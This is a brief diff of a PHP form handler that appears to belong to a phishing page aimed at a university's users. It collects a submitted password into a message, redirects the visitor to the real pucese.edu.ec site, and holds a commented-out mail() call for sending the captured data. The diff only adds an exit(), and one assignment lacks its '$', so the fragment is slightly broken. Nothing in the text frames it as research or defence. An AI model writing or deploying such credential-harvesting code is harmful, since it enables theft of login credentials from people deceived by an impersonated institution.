@@ -10,6 +10,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $message .= "Contraseña: " . $password . "\n";
 
     headers = "Location: https://www.pucese.edu.ec";
+    exit();
 
  /*   if (mail($to, $subject, $message, $headers)) {
         echo "Los datos se han enviado correctamente.";
